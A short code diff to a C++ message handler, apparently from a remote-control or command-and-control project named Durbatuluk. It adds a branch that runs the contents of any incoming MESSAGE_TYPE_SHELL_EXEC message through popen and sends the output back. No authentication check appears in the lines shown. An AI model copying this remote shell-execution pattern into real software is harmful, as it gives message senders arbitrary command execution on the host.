@@ -22,13 +22,24 @@
 #include "message_handler.h"
 
 /*static*/ bool MessageHandler::HandleMessage(
-  std::string& input, std::string& output)
+  const DurbatulukMessage& input, DurbatulukMessage& output)
 {
+  if (input.type() == MESSAGE_TYPE_SHELL_EXEC)
+  {
+    std::string shell_exec_output;
+    if (ShellExec(input.contents(), shell_exec_output))
+    {
+      output.set_type(MESSAGE_TYPE_SHELL_EXEC_OUTPUT);
+      output.set_contents(shell_exec_output);
+      return true; // success
+    }
+  }
+
   return false; // problem
 }
 
 /*static*/ bool MessageHandler::ShellExec(
-  std::string& input, std::string& output)
+  const std::string& input, std::string& output)
 {
   FILE* fp = popen(input.c_str(), "r");
   if (fp == NULL)
